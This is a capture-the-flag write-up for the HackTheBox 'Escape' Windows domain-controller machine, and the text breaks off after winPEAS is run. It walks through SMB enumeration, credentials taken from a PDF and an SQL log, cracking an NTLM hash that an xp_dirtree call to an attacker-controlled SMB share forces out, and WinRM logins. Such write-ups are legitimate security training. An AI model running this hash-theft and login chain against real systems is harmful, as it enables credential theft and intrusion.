### Escape HackTheBox

### Difficulty = Medium

### IP Address = 10.129.157.76

Nmap Scan:

```
─$ nmap -sCV -A 10.129.157.76 -p53,88,135,139,389,445,464,593,636,1433,3269,5985,9389 -oN nmapscan -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-26 18:04 WAT
Nmap scan report for 10.129.157.76
Host is up (0.27s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-27 01:04:59Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-27T01:06:33+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-27T01:06:28+00:00; +7h59m56s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: sequel
|   NetBIOS_Domain_Name: sequel
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sequel.htb
|   DNS_Computer_Name: dc.sequel.htb
|   DNS_Tree_Name: sequel.htb
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-26T23:07:12
|_Not valid after:  2053-02-26T23:07:12
|_ssl-date: 2023-02-27T01:06:33+00:00; +7h59m59s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-27T01:06:31+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   10.129.157.76:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time: 
|   date: 2023-02-27T01:05:45
|_  start_date: N/A
|_clock-skew: mean: 7h59m58s, deviation: 1s, median: 7h59m57s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.62 seconds
```

I'll add the domain name to my `/etc/hosts` file

```
└─$ cat /etc/hosts | grep sequel                     
10.129.157.76   sequel.htb dc.sequel.htb
```

From the scan we know that this is a windows box and its running an active directory environment

I'll start with ldap but i wasn't able to get anything from using nmap scripting engine for ldap

```
└─$ nmap --script "*ldap*" -p389,636 10.129.157.76 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-26 18:11 WAT
Nmap scan report for sequel.htb (10.129.157.76)
Host is up (0.28s latency).

PORT    STATE SERVICE
389/tcp open  ldap
|_ldap-brute: ERROR: Script execution failed (use -d to debug)
636/tcp open  ldapssl

Nmap done: 1 IP address (1 host up) scanned in 90.07 seconds
```

Now lets move on to smb

#### SMB Enumeration

I'll check if we can list our shares anonymously

```
└─$ smbclient -L 10.129.157.76
Password for [WORKGROUP\mark]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.157.76 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Ok cool we can now i'll connect to each share

```
└─$ smbclient //10.129.157.76/NETLOGON
Password for [WORKGROUP\mark]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> q
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Escape]
└─$ smbclient //10.129.157.76/Public  
Password for [WORKGROUP\mark]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 12:51:25 2022
  ..                                  D        0  Sat Nov 19 12:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022

                5184255 blocks of size 4096. 1315642 blocks available
smb: \> mget *
Get file SQL Server Procedures.pdf? y
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (45.7 KiloBytes/sec) (average 45.7 KiloBytes/sec)
smb: \> q
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Escape]
└─$ smbclient //10.129.157.76/SYSVOL
Password for [WORKGROUP\mark]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> q
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Escape]
└─$ 
```

Since we're given a sql procedure pdf file lets check it out

I'll check our the metadata of the file first 

```
└─$ exiftool SQL\ Server\ Procedures.pdf 
ExifTool Version Number         : 12.44
File Name                       : SQL Server Procedures.pdf
Directory                       : .
File Size                       : 50 kB
File Modification Date/Time     : 2023:02:26 18:18:02+01:00
File Access Date/Time           : 2023:02:26 18:18:01+01:00
File Inode Change Date/Time     : 2023:02:26 18:18:02+01:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 2
Creator                         : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/0.15.6 Chrome/100.0.4896.160 Electron/18.3.5 Safari/537.36
Producer                        : Skia/PDF m100
Create Date                     : 2022:11:18 13:39:43+00:00
Modify Date                     : 2022:11:18 13:39:43+00:00
```

Now lets read it 
![image](https://user-images.githubusercontent.com/113513376/221426011-72006f6c-bbeb-499c-a691-6222d84f074e.png)
![image](https://user-images.githubusercontent.com/113513376/221426019-8cb35945-daad-4ce3-a621-a383c5ba0cc3.png)

With that we know that we looted cred and users from it

```
ryan
Ryan
tom
Tom
brandon.brown


* Cred *
PublicUser:GuestUserCantWrite1
```

We know that we can access the mssql server running on the host using the cred `PublicUser:GuestUserCantWrite1`

#### Enumerating MSSQL 

We can connect to it using `impacket-mssqlclient`

But while i tried using impacket-mssqlclient i had some library issues and coudln't fix it 

So i decided to use `sqsh`

```
└─$ sqsh -S sequel.htb -U PublicUser -P GuestUserCantWrite1
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> 
```

Now that i'm connected i'll try to see if i can access external shares which will lead to ntlm hash theft 🤓

First i'll set up an smbserver then run the command

```
xp_dirtree '\\10.10.15.124\share'  
```

Here's the command 
![image](https://user-images.githubusercontent.com/113513376/221429699-f0bbc811-584b-4060-a44b-cfb23f300455.png)

We now have the hash for user sql_svc 

Here's the resource that helped me do this [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

I'll save it in a file and brute force using JTR

```
└─$ john -w=/home/mark/Documents/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)     
1g 0:00:00:34 DONE (2023-02-26 19:35) 0.02863g/s 306437p/s 306437c/s 306437C/s REINLY..REDMAN69
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Lets login to winrm using the cred `sql_svc:REGGIE1234ronnie`

```
└─$ evil-winrm -u sql_svc -p REGGIE1234ronnie -i sequel.htb

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```

Checking the sqldirectory there's a log file in it

```
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer
d-r---         2/1/2023   1:55 PM                Users
d-----         2/6/2023   7:21 AM                Windows

*Evil-WinRM* PS C:\> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Brandon.Brown            Guest
James.Roberts            krbtgt                   Nicole.Thompson
Ryan.Cooper              sql_svc                  Tom.Henn
The command completed with one or more errors.

*Evil-WinRM* PS C:\> cd SQLServer
*Evil-WinRM* PS C:\SQLServer> dir


    Directory: C:\SQLServer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe


*Evil-WinRM* PS C:\SQLServer> cd Logs
*Evil-WinRM* PS C:\SQLServer\Logs> dir


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK


*Evil-WinRM* PS C:\SQLServer\Logs> 
```

And the size is much so i'll just read the content and filter out `failed` P.S `I already had to download it and analyze it well` 

```
*Evil-WinRM* PS C:\SQLServer\Logs> Select-String ./ERRORLOG.BAK -Pattern 'failed'

ERRORLOG.BAK:36:2022-11-18 13:43:06.06 Server      Perfmon counters for resource governor pools and groups failed to initialize and are disabled.
ERRORLOG.BAK:112:2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
ERRORLOG.BAK:114:2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]


*Evil-WinRM* PS C:\SQLServer\Logs> 
```

Cool we see another cred `Ryan.Cooper:NuclearMosquito3`

I'll try it over winrm 

```
└─$ evil-winrm -u Ryan.Cooper -p NuclearMosquito3 -i sequel.htb

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
```

I upload winPEAS.exe to the target and run it

After running it I got this which i found suspicious

```
